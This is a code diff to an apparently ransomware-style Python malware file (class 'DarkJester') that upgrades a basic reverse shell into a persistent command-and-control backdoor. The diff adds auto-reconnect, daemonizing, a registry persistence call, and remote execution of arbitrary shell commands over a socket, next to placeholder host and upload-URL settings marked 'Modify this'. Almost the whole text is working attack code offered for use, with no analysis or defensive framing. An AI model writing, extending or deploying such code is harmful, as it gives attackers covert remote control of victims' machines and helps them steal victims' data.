@@ -117,10 +117,14 @@ class DarkJester:
         except requests.RequestException as e:
             print(f"Error exfiltrating key: {e}")
 
-class ReverseShell:
+class C2_Server:
     def __init__(self, host, port):
         self.host = host
         self.port = port
+        self.reconnect_interval = 5
+        self.current_dir = os.getcwd()
+        self.command_delimiter = "<START>"
+        self.response_delimiter = "<END>"
 
     def daemonize(self):
         try:
@@ -146,17 +150,77 @@ class ReverseShell:
             os.dup2(null_file.fileno(), sys.stdout.fileno())
             os.dup2(null_file.fileno(), sys.stderr.fileno())
 
+    def connect_to_server(self):
+        while True:
+            try:
+                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                client.connect((self.host, self.port))
+                return client
+            except Exception as e:
+                print(f"Connection failed: {e}")
+                time.sleep(self.reconnect_interval)
+
+    def execute_command(self, command):
+        try:
+            command = command.strip()
+            if command.lower() == 'cd':
+                return self.current_dir
+            elif command.lower().startswith('cd '):
+                new_dir = command[3:].strip()
+                try:
+                    target_dir = os.path.abspath(os.path.join(self.current_dir, new_dir))
+                    if os.path.isdir(target_dir):
+                        os.chdir(target_dir)
+                        self.current_dir = target_dir
+                        return f"[*] Changed directory to {self.current_dir}"
+                    else:
+                        return f"[*] Error: Directory '{new_dir}' does not exist"
+                except Exception as e:
+                    return f"[*] Error changing directory: {e}"
+            else:
+                result = sp.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
+                    cwd=self.current_dir
+                )
+                output = result.stdout + result.stderr
+                return output if output else "[*] Command executed"
+        except Exception as e:
+            return f"[*] Error executing command: {e}"
+
     def start(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.host, self.port))
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        pty.spawn("/bin/sh")
+        self.add_to_registry()
+        while True:
+            client = self.connect_to_server()
+            try:
+                while True:
+                    command = ""
+                    while True:
+                        data = client.recv(1024).decode('utf-8', errors='ignore')
+                        if not data:
+                            raise Exception("Client disconnected")
+                        command += data
+                        if self.command_delimiter in command:
+                            command = command.split(self.command_delimiter)[1].strip()
+                            break
+                    if command.lower() == 'exit':
+                        break
+                    result = self.execute_command(command)
+                    response = f"{result}\n{self.response_delimiter}"
+                    client.send(response.encode('utf-8'))
+            except Exception as e:
+                print(f"Connection lost: {e}")
+            finally:
+                client.close()
+                time.sleep(self.reconnect_interval)
 
 if __name__ == "__main__":
     jester = DarkJester()
-    shell = ReverseShell('127.0.0.1', 1234) # Modify this
+    shell = C2_Server('127.0.0.1', 1234) # Modify this
     server_url = "http://127.0.0.1:5000/upload" # Modify this
     shell.daemonize()
     user_directory = "/home"
